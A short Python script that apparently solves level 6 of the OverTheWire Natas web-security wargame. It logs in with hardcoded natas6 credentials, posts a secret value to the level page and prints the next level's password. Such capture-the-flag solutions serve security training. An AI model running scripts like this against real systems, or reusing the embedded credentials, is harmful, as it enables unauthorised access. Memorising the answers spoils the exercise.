import requests as req
import re



username="natas6"
password='0RoJwHdSKWFTYR5WuiAewauSuNaBXned'
data={
    "secret":"FOEIUWGHFEEUHOFUOIU",
    "submit": "Submit"
}
url="http://%s.natas.labs.overthewire.org/" % username

response=req.post(url,auth=(username,password),data=data)

print(re.findall("Access granted. The password for natas7 is (.*)",response.text)[0])


